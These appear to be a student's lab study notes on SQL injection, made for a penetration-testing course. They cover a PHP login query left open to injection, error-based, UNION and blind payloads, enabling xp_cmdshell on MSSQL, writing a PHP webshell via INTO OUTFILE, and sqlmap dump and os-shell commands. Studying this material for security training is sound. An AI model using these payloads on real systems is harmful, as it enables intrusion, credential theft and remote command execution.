SQL theory

relational data base

syntax commands and function vary based on relational data base
MySQL, Microsft SQL server, PostgreSQL and Oracle

MySQL query to parse users table and retieeve a specific user entry

SELECT * FROM users WHERE user_name='leon'
SELECT statement to instruct db to retrieve all (*) from  the users db where the field user_name is leon

to automate finctions web app embed SQL queries within source code

example backend PHP:\
<?php
$uname = $_POST['uname'];
$passwd = $_POST['password'];

$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";
$result = mysqli_query($con, $sql_query);
?>

above code lacks sanitisation, SQL injection

DB types and characteristics

MySQL is the most deplyed DB variants with MariaDB

mysql command we can connect to the remote sql instance with root as password and username

mysql -u root -p'root' -h 192.168.50.16 -P 3306

default port of MySQL is 3306

select version(); for version of SQL

select system_user(); whoami for SQL

ctrl L clearing output clear

show databases; shows all databases in the session

SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
grabing the password of the user is offsec



MSSQL: db management system that intergated into windows

bultin command line tool of SQLCMD 
kali linux has impacket a python framwork what supports Tabular Data Stream a protocol adopted by MSSQL

impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
this can be run from kali to minic a windows client connecting to the SQL instance 

SELECT @@version; instead of just version();

SELECT name FROM sys.databases; instead of show databases;

master, tempdb, model, msdb are default databases

SELECT * FROM offsec.information_schema.tables; to select the custom database

select * from offsec.dbo.users; showing all uses cat /etc/passwd


Manual SQL Exploitation

vulnerability analysis of the previous PHP code

both uname and password parameters come from the user-supplied input, we can control thr $sql_query var and craft a different SQL query

Error based: 
offsec' OR 1=1 -- //
forcing the closing quote on the uname valie and adding OR 1=1 and a -- comment separator and // we can permaturely terminate the statement

we poisoned the statement with a true variable 1=1 and a OR statement, so no need to pass password, 

insert inside the username field instead of password

' is very important as it tests if the termination statement gets passed to the SQL backend


' or 1=1 in (select @@version) -- //
version enum injection
in operator to compare a boolean value 1=1 with a numeric value of the db version, the returned error would be the version

OR 1=1 in (SELECT * FROM users) -- // 
this dumps all the data in users table

' or 1=1 in (SELECT password FROM users) -- //
this dumps the password collum from users table

' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
grabs the hash of the admin user


UNION based payloads

UNION keyword aids exploitation: enables execution of an extra SELECT statement

finding out the exact number of columns present in the target table
' ORDER BY 1-- //
the above command orders the results by a specific collumn, it will fail when the selected column doesn't exists, increasing the column value by one each time to use

%gives all data, % is a wildcard for LIKE

%' UNION SELECT 'a1', 'a2', 'a3' ... --//
this command injects a1, a2, a3 ect to the displayed table to id fields

%' UNION SELECT database(), user(), @@version, null, null -- //
this enums the user, mysql version and database name

' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
retriving the columns table from the information_schema db, storing the output in the 2 3 4 columns so that the 1st column's int only restriction doesn't affect data

UNION only works if the command's columns matches the db's column number, fill with null

Blind SQL injections

db responses are never returned, and behavior is inferred

so we can either infere data from app's actions based on a boolean value or time based true false

using URL embed:
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
we test boolean based SQLi



http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
time based 


Manual and automated code excution

manual code execution

Microsft SQL server, xp_cmdshell, takes string and passes it to a comman shell

must be called with EXECUTE

impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
logging in

EXECUTE sp_configure 'show advanced options', 1;
enable advanced options by setting it to 1

RECONFIGURE;
applying the changes to the running config 

EXECUTE sp_configure 'xp_cmdshell', 1;
enable xp_cmdshell

RECONFIGURE;
apply to running config

with the above features enabled we exe any windows shell command
EXECUTE xp_cmdshell 'whomai'

with full control we can just upgrade this to a normal reverse shell


MYSQL

we abuse SELECT INTO_OUTFILE to weite files on the web server


' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
using the union select to include php shell into the first column and save it as webshell.php

we can access the webshell via webshell.php?cmd=<command>


Automating the attack

SQL injection process we followed can be automated with things like sqlmap 

sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
-u <url to scan> -p parameter to test

sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
dumping the entire data base we use --dump

--os-shell full interactive shell (don't be dumb, don't do this when time based SQLI)

interceppt POST request via BURP and save it as local text file

sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
-r parameter pushes the POST request as argument
we also need to indicaate which parameter is vulnerable to sqlmap -p 


